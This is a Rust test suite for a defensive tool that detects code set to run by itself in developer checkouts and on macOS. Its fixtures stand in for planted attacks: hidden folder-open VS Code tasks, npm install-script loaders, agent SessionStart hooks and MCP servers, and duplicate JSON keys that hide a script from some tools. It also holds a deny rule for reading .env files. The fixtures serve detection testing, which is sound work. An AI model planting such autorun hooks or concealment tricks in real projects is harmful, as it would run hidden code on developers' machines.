//! Promises of what runs by itself in a checkout and of indicators. Every test runs the real
//! binary on an invented estate under a temporary folder: checkouts with an editor's task
//! file and lockfiles, and a list of indicators next to the store. Nothing real is read.

use rusqlite::Connection;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

const TASKS_KIND: &str = "editor tasks set to run when a checkout's folder is opened";
const OTHERS_KIND: &str = "other ways a checkout runs code by itself";
const LIST_KIND: &str = "indicator list given as a file";
const UNMATCHED_KIND: &str = "indicators against what this build does not match them with";
const AUTOSTART_KIND: &str = "launch agents and daemons";
/// The rule of the item that tells the places read for the first time.
const FIRST_READ: &str = "watched.first-read";

/// A task file as an editor writes it, with a task set to run when the folder is opened.
const ON_OPEN: &str = r#"{
    // See https://go.microsoft.com/fwlink/?LinkId=733558
    "version": "2.0.0",
    "tasks": [
        {
            "label": "install",
            "type": "shell",
            "command": "node .vscode/setup.js",
            "presentation": { "reveal": "never" },
            "runOptions": { "runOn": "folderOpen" }, /* runs on opening */
        },
    ]
}
"#;

/// A task file with a task that runs only when asked.
const ON_ASK: &str = r#"{
    // build
    "version": "2.0.0",
    "tasks": [{ "label": "build", "type": "shell", "command": "make", }]
}
"#;

const LOCK: &str = r#"{
  "name": "shop",
  "lockfileVersion": 3,
  "packages": {
    "": { "name": "shop" },
    "node_modules/left-pad": {
      "version": "1.3.0",
      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"
    }
  }
}
"#;

struct Estate(PathBuf);

impl Estate {
    fn new(tag: &str) -> Estate {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let path =
            std::env::temp_dir().join(format!("immune-runs-{tag}-{}-{nanos}", std::process::id()));
        for dir in ["home", "system", "empty"] {
            std::fs::create_dir_all(path.join(dir)).unwrap();
        }
        std::fs::write(path.join("brew.json"), "{\"formulae\": [], \"casks\": []}").unwrap();
        Estate(path)
    }

    fn home(&self) -> PathBuf {
        self.0.join("home")
    }

    fn store(&self) -> PathBuf {
        self.0.join("store.db")
    }

    /// A checkout as git leaves it, under the home folder.
    fn checkout(&self, rel: &str) -> PathBuf {
        let path = self.home().join(rel);
        put(&path.join(".git/HEAD"), "ref: refs/heads/main\n");
        path
    }

    /// The list of indicators next to the store, where it is read from by default.
    fn list(&self, entries: &str) {
        std::fs::write(self.0.join("indicators.json"), entries).unwrap();
    }

    fn run(&self) -> String {
        self.run_in(&self.home())
    }

    /// A run whose walk for checkouts is pointed at `root`.
    fn run_in(&self, root: &Path) -> String {
        self.run_with(root, &self.0.join("empty"))
    }

    /// A run whose walk is pointed at `root` and whose agents' sessions are in `sessions`.
    fn run_with(&self, root: &Path, sessions: &Path) -> String {
        let empty = self.0.join("empty");
        let out = Command::new(env!("CARGO_BIN_EXE_immune"))
            .env("HOME", self.home())
            .env("PATH", "/usr/bin:/bin")
            .current_dir(&self.0)
            .args(["run", "--machine-name", "mac", "--store"])
            .arg(self.store())
            .arg("--system-root")
            .arg(self.0.join("system"))
            .arg("--brew-input")
            .arg(self.0.join("brew.json"))
            .args(["--tailscale", "none", "--threats-input", "none"])
            .args(["--osv-crates-input", "none", "--osv-npm-input", "none"])
            .arg("--checkouts-root")
            .arg(root)
            .arg("--sessions-root")
            .arg(sessions)
            .arg("--servers-input")
            .arg(&empty)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8(out.stdout).unwrap()
    }

    fn rows(&self, sql: &str) -> Vec<String> {
        let db = Connection::open(self.store()).unwrap();
        let mut stmt = db.prepare(sql).unwrap();
        let n = stmt.column_count();
        stmt.query_map([], |r| {
            Ok((0..n)
                .map(|i| r.get::<_, Option<String>>(i).unwrap().unwrap_or_default())
                .collect::<Vec<_>>()
                .join("|"))
        })
        .unwrap()
        .collect::<rusqlite::Result<_>>()
        .unwrap()
    }

    /// The latest reading of a kind on this machine, as completeness and reason.
    fn coverage(&self, kind: &str) -> String {
        self.rows(&format!(
            "SELECT completeness, reason FROM coverage WHERE scope = 'machine:mac'
               AND kind = '{}' ORDER BY id DESC LIMIT 1",
            kind.replace('\'', "''")
        ))
        .concat()
    }

    /// What the latest reading of a kind names as having no reader, as what and name.
    fn lacks(&self, kind: &str) -> Vec<String> {
        self.rows(&format!(
            "SELECT what, name FROM coverage_lack WHERE coverage =
               (SELECT MAX(id) FROM coverage WHERE kind = '{}') ORDER BY name",
            kind.replace('\'', "''")
        ))
    }

    /// Findings, open ones unless `all`, as rule, state, where and value.
    fn findings(&self, all: bool) -> Vec<(String, String, String, String)> {
        let s = |v: &serde_json::Value| v.as_str().unwrap_or_default().to_string();
        self.contract(&["findings"])["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|f| all || f["finding"]["state"] == "open")
            .map(|f| {
                let one = self.contract(&["finding", f["finding"]["id"].as_str().unwrap()]);
                (
                    s(&f["finding"]["rule"]),
                    s(&f["finding"]["state"]),
                    s(&f["where_text"]),
                    s(&one["evidence"]["indicator_matched"]["indicators_text"]),
                )
            })
            .collect()
    }

    /// `immune <args> --json --store <this store>`, as the contract's message.
    fn contract(&self, args: &[&str]) -> serde_json::Value {
        let out = Command::new(env!("CARGO_BIN_EXE_immune"))
            .args(args)
            .args(["--json", "--store"])
            .arg(self.store())
            .output()
            .unwrap();
        assert!(out.status.success());
        serde_json::from_slice(&out.stdout).unwrap()
    }

    fn rules(&self) -> Vec<String> {
        self.findings(false).into_iter().map(|f| f.0).collect()
    }

    /// `immune status --json`'s result.
    fn status(&self) -> serde_json::Value {
        let out = Command::new(env!("CARGO_BIN_EXE_immune"))
            .args(["status", "--json", "--store"])
            .arg(self.store())
            .output()
            .unwrap();
        serde_json::from_slice::<serde_json::Value>(&out.stdout).unwrap()["result"].clone()
    }

    /// The page of what is watched on this Mac.
    fn this_mac_page(&self) -> String {
        let out = Command::new(env!("CARGO_BIN_EXE_immune"))
            .args(["view", "--no-open", "--store"])
            .arg(self.store())
            .output()
            .unwrap();
        assert!(out.status.success());
        let pages = String::from_utf8(out.stdout).unwrap();
        let path = pages
            .lines()
            .find(|p| p.ends_with("this-mac.html"))
            .unwrap()
            .to_string();
        std::fs::read_to_string(path).unwrap()
    }

    /// The open findings as rule and where, sorted.
    fn found(&self) -> Vec<(String, String)> {
        let mut found: Vec<(String, String)> = self
            .findings(false)
            .into_iter()
            .map(|f| (f.0, f.2))
            .collect();
        found.sort();
        found
    }

    /// The places the open item of places read for the first time names, each as its id with
    /// how many things it held; empty when there is none.
    fn told(&self) -> Vec<String> {
        let listed = self.contract(&["findings"]);
        let Some(f) = listed["findings"]
            .as_array()
            .unwrap()
            .iter()
            .find(|f| f["finding"]["rule"] == FIRST_READ && f["finding"]["state"] == "open")
        else {
            return Vec::new();
        };
        let one = self.contract(&["finding", f["finding"]["id"].as_str().unwrap()]);
        one["rests_on"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|j| j["entry"] == "place_first_read")
            .map(|j| {
                format!(
                    "{} ({})",
                    j["subject_text"].as_str().unwrap(),
                    j["new_value_text"].as_str().unwrap()
                )
            })
            .collect()
    }

    /// Leaves the store as a build from before units were recorded left it.
    fn made_before_units(&self) {
        Connection::open(self.store())
            .unwrap()
            .execute_batch("DROP TABLE unit_read; DELETE FROM meta WHERE key = 'units_since';")
            .unwrap();
    }

    /// How many differences the journal marks as found where nobody could have known, after
    /// the journal entry `after`.
    fn silent_after(&self, after: i64) -> i64 {
        self.rows(&format!(
            "SELECT CAST(COUNT(*) AS TEXT) FROM journal
             WHERE text = 'first reading of its place' AND seq > {after}"
        ))[0]
            .parse()
            .unwrap()
    }

    /// The last journal entry so far.
    fn last_entry(&self) -> i64 {
        self.rows("SELECT CAST(MAX(seq) AS TEXT) FROM journal")[0]
            .parse()
            .unwrap()
    }

    /// The owner says he has seen every open finding.
    fn seen(&self) {
        let listed = self.contract(&["findings"]);
        let open = listed["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|f| f["finding"]["state"] == "open");
        for f in open {
            let out = Command::new(env!("CARGO_BIN_EXE_immune"))
                .args([
                    "finding",
                    f["finding"]["id"].as_str().unwrap(),
                    "seen",
                    "--store",
                ])
                .arg(self.store())
                .output()
                .unwrap();
            assert!(out.status.success());
        }
        assert!(self.rules().is_empty());
    }
}

impl Drop for Estate {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn link(target: &str, at: &Path) {
    std::fs::create_dir_all(at.parent().unwrap()).unwrap();
    std::os::unix::fs::symlink(target, at).unwrap();
}

fn put(path: &Path, content: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, content).unwrap();
}

// What runs by itself.

#[test]
fn a_task_set_to_run_on_opening_is_found_in_a_checkout_that_arrives_after_the_baseline() {
    // The first reading on this Mac is the baseline: a task already there is not news. A
    // checkout cloned later with such a task is the incident's way in, so it is found, though
    // the checkout itself is new.
    let e = Estate::new("arrives");
    let old = e.checkout("dev/old");
    put(&old.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    assert_eq!(e.coverage(TASKS_KIND), "full|");
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    let new = e.checkout("dev/new");
    put(&new.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    let found = e.findings(false);
    assert_eq!(found.len(), 1, "{found:?}");
    assert_eq!(found[0].0, "autorun.folder-open");
    assert_eq!(found[0].2, "~/dev/new/.vscode/tasks.json");
    // Its file changes after the owner has seen it: found again.
    e.seen();
    put(
        &new.join(".vscode/tasks.json"),
        &ON_OPEN.replace("setup", "steal"),
    );
    e.run();
    assert_eq!(e.rules(), ["autorun.folder-open"]);
}

#[test]
fn a_task_file_with_no_such_task_is_not_watched_until_one_is_added() {
    let e = Estate::new("added");
    let shop = e.checkout("dev/shop");
    let tasks = shop.join(".vscode/tasks.json");
    put(&tasks, ON_ASK);
    e.run();
    assert_eq!(
        e.coverage(TASKS_KIND),
        "full|no checkout has an editor task set to run when its folder is opened"
    );
    // Edited, still with no task set to run on opening: nothing to say.
    put(&tasks, &ON_ASK.replace("make", "make all"));
    e.run();
    assert!(e.rules().is_empty());
    put(&tasks, ON_OPEN);
    e.run();
    assert_eq!(e.rules(), ["autorun.folder-open"]);
    // Taken out again: the file leaves the watched ones, and that is nothing to find.
    e.seen();
    put(&tasks, ON_ASK);
    e.run();
    assert!(e.rules().is_empty());
    assert!(
        e.rows(
            "SELECT subject FROM assertion WHERE layer = 'live' AND predicate = 'watched_as'
                 AND object = 'task run when the project folder is opened'"
        )
        .is_empty()
    );
}

#[test]
fn a_task_file_that_cannot_be_read_as_json_with_comments_is_a_failed_reading_never_no_task() {
    let e = Estate::new("unparsed");
    let shop = e.checkout("dev/shop");
    put(
        &shop.join(".vscode/tasks.json"),
        "{ \"tasks\": [ { \"label\": } ] }",
    );
    e.run();
    let coverage = e.coverage(TASKS_KIND);
    assert!(
        coverage.starts_with("none|could not be read: dev/shop/.vscode/tasks.json (")
            && coverage.contains("line 1"),
        "{coverage}"
    );
}

#[test]
fn a_task_file_that_is_not_a_regular_file_or_is_too_large_is_a_failed_reading() {
    let e = Estate::new("not-regular");
    std::fs::create_dir_all(e.checkout("dev/a").join(".vscode/tasks.json")).unwrap();
    let big = format!("{{\"tasks\": []}}{}", " ".repeat(1024 * 1024));
    put(&e.checkout("dev/b").join(".vscode/tasks.json"), &big);
    e.run();
    assert_eq!(
        e.coverage(TASKS_KIND),
        "none|could not be read: dev/a/.vscode/tasks.json (not a regular file); dev/b/.vscode/tasks.json (over the size cap of 1024 KiB)"
    );
}

#[test]
fn other_ways_a_project_runs_code_by_itself_are_named_where_they_are_present() {
    // They are not read, so what they would run is not known: the report says so by name,
    // with how many checkouts hold each, and says nothing of what is not there, nor of what
    // is read. A file under a worktree's `.git`, which is a file, is not there.
    let e = Estate::new("others");
    for rel in ["dev/a", "dev/b"] {
        let c = e.checkout(rel);
        put(&c.join(".npmrc"), "ignore-scripts=false\n");
        put(&c.join("package.json"), "{\"scripts\": {}}");
    }
    put(&e.checkout("dev/c").join(".envrc"), "use flake\n");
    put(
        &e.home().join("dev/tree/.git"),
        "gitdir: /invented/.git/worktrees/tree\n",
    );
    e.run();
    assert_eq!(
        e.coverage(OTHERS_KIND),
        "none|not read: .envrc in 1 checkout; .npmrc in 2 checkouts"
    );
    assert_eq!(
        e.lacks(OTHERS_KIND),
        [
            "way a project runs code by itself|.envrc",
            "way a project runs code by itself|.npmrc"
        ]
    );
    for c in ["dev/a", "dev/b", "dev/c"] {
        std::fs::remove_dir_all(e.home().join(c)).unwrap();
    }
    e.run();
    assert_eq!(e.coverage(OTHERS_KIND), "full|");
    assert!(e.lacks(OTHERS_KIND).is_empty());
}

/// A project's `package.json` with these scripts.
fn package(c: &Path, scripts: &str) {
    put(
        &c.join("package.json"),
        &format!(
            "{{\n  \"name\": \"shop\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{{scripts}}}\n}}\n"
        ),
    );
}

/// Settings of Claude Code for a project, with this more.
fn agent(c: &Path, more: &str) {
    put(
        &c.join(".claude/settings.json"),
        &format!("{{\"permissions\": {{\"deny\": [\"Read(./.env)\"]}}{more}}}"),
    );
}

const HOOK: &str = r#", "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "node .invented/start-91c2.js"}]}]}"#;
const SERVER: &str =
    r#"{"mcpServers": {"helper": {"command": "npx", "args": ["-y", "invented-helper-5d0e"]}}}"#;

fn pair(rule: &str, place: &str) -> (String, String) {
    (rule.to_string(), place.to_string())
}

#[test]
fn a_planted_install_script_and_a_planted_agent_hook_are_findings_and_their_removal_is_not() {
    // The incident's uncaught step and ChainDrop's: a script a package manager runs on
    // install, a hook and a server an agent starts. Each is found by the rule of what runs it
    // and named by its file and key; what else changes in those files is not read.
    let e = Estate::new("planted");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"test\": \"jest\"");
    agent(&shop, "");
    put(&shop.join(".mcp.json"), "{\"mcpServers\": {}}");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    package(
        &shop,
        "\"test\": \"jest\", \"prepare\": \"node .invented/loader-7f3a.js\"",
    );
    agent(&shop, HOOK);
    put(&shop.join(".mcp.json"), SERVER);
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-start",
                "~/dev/shop/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/shop/.mcp.json#/mcpServers/helper"
            ),
            pair(
                "autorun.package-install",
                "~/dev/shop/package.json#/scripts/prepare"
            ),
        ]
    );

    // What runs only when asked, and keys no tool runs, change: nothing to say.
    e.seen();
    put(
        &shop.join("package.json"),
        "{\"name\": \"shop\", \"version\": \"1.1.0\", \"scripts\": {\"prepare\": \"node .invented/loader-7f3a.js\", \"test\": \"jest --ci\"}}",
    );
    agent(&shop, &format!("{HOOK}, \"model\": \"opus\""));
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    // Taken out: they leave what is watched, and that is nothing to find.
    package(&shop, "\"test\": \"jest\"");
    agent(&shop, "");
    put(&shop.join(".mcp.json"), "{\"mcpServers\": {}}");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    assert!(
        e.rows(
            "SELECT subject FROM assertion WHERE layer = 'live' AND predicate = 'watched_as'
               AND subject LIKE '%#/%'"
        )
        .is_empty()
    );
}

#[test]
fn the_text_of_a_script_or_a_command_is_never_kept_printed_or_returned() {
    // A script is code someone else wrote: kept, it could be read as an instruction, and it
    // may hold a token. Only its checksum is kept.
    let e = Estate::new("no-text");
    let shop = e.checkout("dev/shop");
    e.run();
    package(&shop, "\"postinstall\": \"node .invented/loader-7f3a.js\"");
    agent(&shop, HOOK);
    put(&shop.join(".mcp.json"), SERVER);
    let mut said = e.run();
    said.push_str(&e.status().to_string());
    said.push_str(&format!("{:?}", e.findings(true)));
    assert_eq!(e.rules().len(), 3, "{said}");
    let mut kept = std::fs::read(e.store()).unwrap();
    for file in walk(&e.0.join("raw")) {
        kept.extend(std::fs::read(file).unwrap());
    }
    for text in ["loader-7f3a", "start-91c2", "invented-helper-5d0e"] {
        assert!(!said.contains(text), "{text}: {said}");
        assert!(
            !kept.windows(text.len()).any(|w| w == text.as_bytes()),
            "{text} is in the store"
        );
    }
}

/// Every file under a folder.
fn walk(dir: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for entry in std::fs::read_dir(dir).into_iter().flatten().flatten() {
        let path = entry.path();
        if path.is_dir() {
            out.extend(walk(&path));
        } else {
            out.push(path);
        }
    }
    out
}

#[test]
fn a_file_that_cannot_be_read_by_key_faithfully_is_read_whole_and_is_never_unchanged() {
    // The false calm: a benign script where one tool looks and a planted one where another
    // does. Read by key it could look unchanged; read whole, any change is one.
    let e = Estate::new("whole");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"prepare\": \"husky\"");
    e.run();
    let kind = "package.json of each checkout, the part that runs by itself";
    assert_eq!(e.coverage(kind), "full|");
    package(
        &shop,
        "\"prepare\": \"node .invented/loader-7f3a.js\", \"prepare\": \"husky\"",
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair("autorun.package-install", "~/dev/shop/package.json")]
    );
    assert_eq!(
        e.coverage(kind),
        "full|read whole, not by key: dev/shop/package.json (two equal keys that tools read differently)"
    );
    // A byte order mark, and a file that is not strict JSON, are read whole too, and say why.
    e.seen();
    put(&shop.join("package.json"), "\u{feff}{\"scripts\": {}}");
    put(
        &e.checkout("dev/blog").join("package.json"),
        "{\"scripts\": {},}",
    );
    e.run();
    let coverage = e.coverage(kind);
    assert!(
        coverage.contains("dev/blog/package.json (not strict JSON: ")
            && coverage.contains("dev/shop/package.json (starts with a byte order mark"),
        "{coverage}"
    );
    assert_eq!(
        e.found(),
        [
            pair("autorun.package-install", "~/dev/blog/package.json"),
            pair("autorun.package-install", "~/dev/shop/package.json"),
        ]
    );
}

#[test]
fn an_agents_file_with_comments_is_read_by_key_so_an_edit_elsewhere_is_no_finding_and_equal_keys_are()
 {
    // Cursor's and Gemini CLI's files are JSON with comments. Read by key, what changes
    // around their servers is nothing to find; a server added is. Two equal keys are read
    // whole, so the one a tool may read is never taken as unchanged.
    let e = Estate::new("comments");
    let shop = e.checkout("dev/shop");
    let cursor = |more: &str| {
        put(
            &shop.join(".cursor/mcp.json"),
            &format!(
                "{{\n  // ours\n  \"mcpServers\": {{\"helper\": {{\"command\": \"npx\"{more}}},}},\n}}\n"
            ),
        )
    };
    let gemini = |theme: &str, servers: &str| {
        put(
            &shop.join(".gemini/settings.json"),
            &format!(
                "{{\n  /* {theme} */ \"ui\": {{\"theme\": \"{theme}\"}},\n  \"mcpServers\": {{{servers}}}\n}}\n"
            ),
        )
    };
    cursor("");
    gemini("dark", "");
    e.run();
    let kind = ".cursor/mcp.json of each checkout, the part that runs by itself";
    assert_eq!(e.coverage(kind), "full|");
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    put(
        &shop.join(".cursor/mcp.json"),
        "{\"mcpServers\": {\"helper\": {\"command\": \"npx\"}}, \"note\": \"edited\" /* again */}",
    );
    gemini("light", "");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    gemini(
        "light",
        "\"x\": {\"command\": \"node .invented/x-4b1e.js\"}",
    );
    cursor(", \"command\": \"node .invented/x-4b1e.js\", \"command\": \"npx\"");
    e.run();
    assert_eq!(
        e.found(),
        [
            pair("autorun.agent-start", "~/dev/shop/.cursor/mcp.json"),
            pair(
                "autorun.agent-start",
                "~/dev/shop/.gemini/settings.json#/mcpServers/x"
            ),
        ]
    );
    assert_eq!(
        e.coverage(kind),
        "full|read whole, not by key: dev/shop/.cursor/mcp.json (two equal keys that tools read differently)"
    );
}

#[test]
fn a_way_read_for_the_first_time_on_a_store_that_never_read_it_is_told_once_and_a_script_planted_after_is_found()
 {
    // A store of an earlier build held the checkouts and never read their package scripts:
    // what they hold at the first reading was there before anyone looked, so it is told once,
    // as information, and raised by no rule. A script planted after it is found.
    let e = Estate::new("upgrade");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"prepare\": \"husky\"");
    agent(&shop, HOOK);
    e.run();
    // As an earlier build left it: no reading of these kinds, nothing they asserted.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM coverage_lack WHERE coverage IN (SELECT id FROM coverage
           WHERE kind LIKE '% of each checkout, the part that runs by itself'
              OR scope LIKE '%#/%');
         DELETE FROM assertion WHERE kind LIKE '% of each checkout, the part that runs by itself'
              OR scope LIKE '%#/%';
         DELETE FROM coverage WHERE kind LIKE '% of each checkout, the part that runs by itself'
              OR scope LIKE '%#/%';
         DELETE FROM unit_read WHERE kind LIKE '% of each checkout, the part that runs by itself';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/dev/shop (2)"]);
    e.seen();
    package(
        &shop,
        "\"prepare\": \"husky\", \"preinstall\": \"node x.js\"",
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.package-install",
            "~/dev/shop/package.json#/scripts/preinstall"
        )]
    );
}

#[test]
fn a_run_pointed_at_one_folder_speaks_only_for_its_projects_and_the_next_run_finds_nothing_old() {
    // A reading of the checkouts is of those it looked into. A run the owner points at one
    // folder did not look at the projects elsewhere: what they hold is not gone, and the next
    // full run does not find it again as new, one alarm per project. What is planted there
    // meanwhile is still found.
    let e = Estate::new("pointed");
    let shop = e.checkout("dev/shop");
    let blog = e.checkout("dev/blog");
    let site = e.checkout("work/site");
    for c in [&shop, &blog, &site] {
        package(c, "\"postinstall\": \"node setup.js\"");
        agent(c, HOOK);
    }
    e.run();
    e.run_in(&e.home().join("work"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    package(
        &blog,
        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.package-install",
            "~/dev/blog/package.json#/scripts/preinstall"
        )]
    );
}

#[test]
fn a_first_run_pointed_at_one_folder_is_silent_there_tells_projects_elsewhere_once_and_finds_what_appears_where_it_looked()
 {
    // The store's first check looked into the projects of one folder: what they hold is the
    // silent baseline. The projects elsewhere were never read; the first run that reads them
    // tells them once and raises nothing about them. What appears where the first run did
    // look, and a clone made after the first run that walked the whole home folder, are found.
    let e = Estate::new("pointed-first");
    let shop = e.checkout("dev/shop");
    let blog = e.checkout("dev/blog");
    let site = e.checkout("work/site");
    // Beside the folder, not in it, though its name begins the same.
    let tools = e.checkout("devtools/cli");
    for c in [&shop, &blog, &site, &tools] {
        package(c, "\"postinstall\": \"node setup.js\"");
        agent(c, HOOK);
    }
    e.run_in(&e.home().join("dev"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    package(
        &blog,
        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
    );
    let report = e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.package-install",
                "~/dev/blog/package.json#/scripts/preinstall"
            ),
            pair(FIRST_READ, "mac"),
        ]
    );
    assert_eq!(
        e.told(),
        [
            "checkout:machine:mac/devtools/cli (2)",
            "checkout:machine:mac/work/site (2)"
        ]
    );
    // What the projects elsewhere hold is not counted as new either.
    assert!(report.contains(", 1 new, 0 changed, 0 gone"), "{report}");
    e.seen();
    // A run pointed at a folder outside the home folder, never looked through before.
    let outside = e.0.join("outside/tool");
    put(&outside.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&outside, "\"preinstall\": \"node x.js\"");
    e.run_in(&e.0.join("outside"));
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    e.seen();
    let new = e.checkout("work/new");
    package(&new, "\"preinstall\": \"node x.js\"");
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.package-install",
            "~/work/new/package.json#/scripts/preinstall"
        )]
    );
}

#[test]
fn a_project_file_that_could_not_be_read_on_the_first_day_is_told_once_when_it_reads_and_a_neighbour_is_still_judged()
 {
    // The first check could not parse one project's task file and read the other's. When the
    // file can be read, what it holds was there all along: it is told once, never silent and
    // never a finding by its rule. A task that appears in the project that was read is found.
    let e = Estate::new("unparsed-then-read");
    let shop = e.checkout("dev/shop");
    let blog = e.checkout("dev/blog");
    put(
        &shop.join(".vscode/tasks.json"),
        "{ \"tasks\": [ { \"label\": } ] }",
    );
    put(&blog.join(".vscode/tasks.json"), ON_ASK);
    e.run();
    assert!(
        e.coverage(TASKS_KIND)
            .starts_with("partial|could not be read: dev/shop/.vscode/tasks.json ("),
        "{}",
        e.coverage(TASKS_KIND)
    );
    put(&shop.join(".vscode/tasks.json"), ON_OPEN);
    put(&blog.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    assert_eq!(
        e.found(),
        [
            pair("autorun.folder-open", "~/dev/blog/.vscode/tasks.json"),
            pair(FIRST_READ, "mac"),
        ]
    );
    assert_eq!(e.told(), ["checkout:machine:mac/dev/shop (1)"]);
}

/// Takes every permission off a folder and gives them back when dropped.
struct Locked(PathBuf);

impl Locked {
    fn new(path: PathBuf) -> Locked {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o000)).unwrap();
        Locked(path)
    }
}

impl Drop for Locked {
    fn drop(&mut self) {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&self.0, std::fs::Permissions::from_mode(0o755));
    }
}

#[test]
fn a_watched_place_that_could_not_be_read_on_the_first_day_is_said_and_told_once_when_it_reads() {
    // The first check could not list one folder of autostart items and says so. What that
    // folder holds when it is first read was there all along: told once, never a finding. In
    // the folder it did read, an item that appears later is found.
    let e = Estate::new("unreadable-place");
    let agents = e.home().join("Library/LaunchAgents");
    put(&agents.join("com.invented.sync.plist"), "<plist/>\n");
    let system = e.0.join("system/Library/LaunchAgents");
    put(&system.join("com.invented.helper.plist"), "<plist/>\n");
    {
        let _locked = Locked::new(agents.clone());
        let report = e.run();
        assert!(
            e.coverage(AUTOSTART_KIND)
                .starts_with("partial|could not be read: Library/LaunchAgents ("),
            "{}",
            e.coverage(AUTOSTART_KIND)
        );
        assert!(
            report.contains("not read in full: launch agents and daemons (partial)"),
            "{report}"
        );
    }
    put(&system.join("com.invented.other.plist"), "<plist/>\n");
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "watched.autostart",
                "/Library/LaunchAgents/com.invented.other.plist"
            ),
            pair(FIRST_READ, "mac"),
        ]
    );
    assert_eq!(e.told(), ["file:machine:mac/Library/LaunchAgents (1)"]);
    assert_eq!(e.coverage(AUTOSTART_KIND), "full|");
}

#[test]
fn a_reading_that_read_nothing_is_still_the_baseline_of_the_places_it_found_empty() {
    // The only autostart folder that was there could not be listed, so the reading read
    // nothing. It still looked at the folders that were not there: an item that appears in
    // one of them is found, and counted, while what the locked folder held is told once.
    let e = Estate::new("read-nothing");
    let agents = e.home().join("Library/LaunchAgents");
    put(&agents.join("com.invented.sync.plist"), "<plist/>\n");
    {
        let _locked = Locked::new(agents.clone());
        e.run();
        assert!(
            e.coverage(AUTOSTART_KIND)
                .starts_with("none|could not be read: Library/LaunchAgents ("),
            "{}",
            e.coverage(AUTOSTART_KIND)
        );
    }
    let system = e.0.join("system/Library/LaunchAgents");
    put(&system.join("com.invented.other.plist"), "<plist/>\n");
    let report = e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "watched.autostart",
                "/Library/LaunchAgents/com.invented.other.plist"
            ),
            pair(FIRST_READ, "mac"),
        ]
    );
    assert!(report.contains(", 1 new, 0 changed, 0 gone"), "{report}");
}

#[test]
fn on_a_store_from_before_units_were_recorded_what_appeared_since_its_last_reading_is_found() {
    // The first open by this build fills the units from what the store holds: what appeared
    // since the older build's last reading is found, in every kind it reads, a clone made
    // meanwhile included.
    let e = Estate::new("from-before");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    put(&e.home().join(".zshrc"), "export A=1\n");
    e.run();
    e.made_before_units();
    put(
        &e.home()
            .join("Library/LaunchAgents/com.invented.sync.plist"),
        "<plist/>\n",
    );
    put(&e.home().join(".zlogin"), "export B=1\n");
    put(&shop.join(".git/hooks/pre-push"), "#!/bin/sh\n");
    package(
        &shop,
        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
    );
    let new = e.checkout("dev/new");
    package(&new, "\"preinstall\": \"node x.js\"");
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.package-install",
                "~/dev/new/package.json#/scripts/preinstall"
            ),
            pair(
                "autorun.package-install",
                "~/dev/shop/package.json#/scripts/preinstall"
            ),
            pair(
                "watched.autostart",
                "~/Library/LaunchAgents/com.invented.sync.plist"
            ),
            pair("watched.git-hook", "~/dev/shop/.git/hooks/pre-push"),
            pair("watched.shell-profile", "~/.zlogin"),
        ]
    );
}

#[test]
fn hooks_first_read_when_a_checkouts_git_file_becomes_a_folder_are_told_once_and_a_hook_added_after_is_found()
 {
    // While `.git` is a file the hooks are kept elsewhere and were not read. When it becomes
    // a folder, the hooks found in it were there before anyone looked: told once. A hook added
    // after that is found.
    let e = Estate::new("git-file");
    let tree = e.home().join("dev/tree");
    put(
        &tree.join(".git"),
        "gitdir: /invented/.git/worktrees/tree\n",
    );
    e.run();
    std::fs::remove_file(tree.join(".git")).unwrap();
    put(&tree.join(".git/HEAD"), "ref: refs/heads/main\n");
    put(&tree.join(".git/hooks/pre-commit"), "#!/bin/sh\n");
    e.run();
